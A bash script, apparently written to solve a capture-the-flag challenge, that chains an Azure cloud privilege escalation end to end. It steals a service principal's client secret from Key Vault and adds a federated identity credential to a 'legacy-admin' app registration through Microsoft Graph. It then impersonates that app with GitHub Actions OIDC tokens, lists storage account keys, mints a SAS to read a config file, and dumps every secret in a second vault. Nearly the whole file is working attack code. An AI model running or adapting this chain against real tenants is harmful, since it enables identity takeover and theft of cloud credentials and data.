#!/usr/bin/env bash
# Chain: directory-audit (Graph write) -> add FIC to tbl-legacy-admin -> OIDC exchange as legacy-admin
#        -> listKeys/SAS on config storage -> read internal-config.json (FLAG). Also read kv-tbl-sec.
set +e
SUB="$AZURE_SUBSCRIPTION_ID"; TEN="$AZURE_TENANT_ID"; RG="rg-tbl-platform-prod-sea"
APPCFG="sttblappcfgprodx3euoz"
LEGACY_APPID="891fb158-e02c-4428-a885-53b811f369c0"
LEGACY_APPOBJ="22a3fb7e-860a-4708-9e50-3d36aa21191c"
ISS="https://token.actions.githubusercontent.com"; AUD="api://AzureADTokenExchange"

mint_oidc () { curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | jq -r .value; }
decode_sub () { python3 -c "import sys,base64,json;p=sys.argv[1].split('.')[1];p+='='*(-len(p)%4);d=json.loads(base64.urlsafe_b64decode(p));print(d.get('sub',''))" "$1"; }

OIDC=$(mint_oidc)
SUBJECT=$(decode_sub "$OIDC")
echo "### OIDC subject = [$SUBJECT]"

# --- directory-audit SP for Graph ---
OIDC_KV=$(curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" --data-urlencode "scope=https://vault.azure.net/.default" | jq -r .access_token)
DSEC=$(curl -s -H "Authorization: Bearer $OIDC_KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/directory-audit-principal?api-version=7.4" | jq -r .value)
DA_ID=$(echo "$DSEC"|jq -r .appId); DA_K=$(echo "$DSEC"|jq -r .clientSecret)
GT=$(curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$DA_ID" -d "grant_type=client_credentials" -d "client_secret=$DA_K" \
  --data-urlencode "scope=https://graph.microsoft.com/.default" | jq -r .access_token)
echo "### directory-audit graph token len: ${#GT}"

# --- add FIC to legacy-admin matching our subject ---
FNAME="ctf-$(date +%s)"
BODY=$(jq -n --arg n "$FNAME" --arg i "$ISS" --arg s "$SUBJECT" --arg a "$AUD" \
  '{name:$n,issuer:$i,subject:$s,audiences:[$a]}')
echo "### creating FIC on legacy-admin: $BODY"
curl -s -X POST -H "Authorization: Bearer $GT" -H "Content-Type: application/json" \
  "https://graph.microsoft.com/v1.0/applications/$LEGACY_APPOBJ/federatedIdentityCredentials" \
  -d "$BODY" | jq -c '{id,name,subject,error:.error.message}'

echo "### existing FICs on legacy-admin now:"
curl -s -H "Authorization: Bearer $GT" \
  "https://graph.microsoft.com/v1.0/applications/$LEGACY_APPOBJ/federatedIdentityCredentials" \
  | jq -r '.value[]? | "   "+.name+" :: "+.subject'

# --- exchange: become legacy-admin (retry for propagation) ---
LA_MG="";
for i in $(seq 1 8); do
  sleep 12
  O2=$(mint_oidc)
  RESP=$(curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
    -d "client_id=$LEGACY_APPID" -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    -d "client_assertion=$O2" --data-urlencode "scope=https://management.azure.com/.default")
  LA_MG=$(echo "$RESP"|jq -r .access_token)
  if [ ${#LA_MG} -gt 100 ] && [ "$LA_MG" != "null" ]; then echo "### became legacy-admin on try $i (mgmt token len ${#LA_MG})"; break; fi
  echo "### try $i: $(echo "$RESP"|jq -r '.error_description' | head -c 120)"
  LA_MG=""
done
[ -z "$LA_MG" ] && { echo "### FAILED to become legacy-admin"; echo "=== DONE ==="; exit 0; }

# --- legacy-admin RBAC ---
LOID=$(python3 -c "import sys,base64,json;p=sys.argv[1].split('.')[1];p+='='*(-len(p)%4);print(json.loads(base64.urlsafe_b64decode(p)).get('oid',''))" "$LA_MG")
echo "### legacy-admin oid=$LOID  role assignments:"
curl -s -H "Authorization: Bearer $LA_MG" \
  "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId%20eq%20'$LOID'" \
  | jq -r '.value[]? | "   role="+(.properties.roleDefinitionId|split("/")|last)+" scope="+.properties.scope'

# --- listKeys on config storage ---
echo "### listKeys $APPCFG:"
KRESP=$(curl -s -X POST -H "Authorization: Bearer $LA_MG" -H "Content-Length: 0" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$APPCFG/listKeys?api-version=2023-05-01")
KEY=$(echo "$KRESP"|jq -r '.keys[0].value')
echo "   listKeys -> keylen=${#KEY}  (err: $(echo "$KRESP"|jq -r '.error.code // "none"'))"

# --- account SAS, then read the blobs ---
if [ ${#KEY} -gt 20 ] && [ "$KEY" != "null" ]; then
  SAS=$(curl -s -X POST -H "Authorization: Bearer $LA_MG" -H "Content-Type: application/json" \
    "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$APPCFG/listAccountSas?api-version=2023-05-01" \
    -d '{"signedServices":"b","signedResourceTypes":"sco","signedPermission":"rl","signedProtocol":"https","signedStart":"2026-10-22T00:00:00Z","signedExpiry":"2026-10-23T00:00:00Z"}' | jq -r .accountSasToken)
  echo "### container listing (config):"
  curl -s "https://$APPCFG.blob.core.windows.net/config?restype=container&comp=list&$SAS" | grep -o '<Name>[^<]*</Name>'
  echo "### >>> internal-config.json CONTENT:"
  curl -s "https://$APPCFG.blob.core.windows.net/config/internal-config.json?$SAS"; echo
fi

# --- also try reading kv-tbl-sec as legacy-admin ---
LA_KV=$(curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$LEGACY_APPID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$(mint_oidc)" --data-urlencode "scope=https://vault.azure.net/.default" | jq -r .access_token)
echo "### kv-tbl-sec secrets as legacy-admin:"
curl -s -H "Authorization: Bearer $LA_KV" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" > /tmp/ks.json
cat /tmp/ks.json | jq -r '.value[]?.id, (.error.message // empty)'
for ID in $(jq -r '.value[]?.id' /tmp/ks.json 2>/dev/null); do
  echo "   SECRET $ID = $(curl -s -H "Authorization: Bearer $LA_KV" "$ID?api-version=7.4" | jq -r .value)"
done
echo "=== DONE ==="
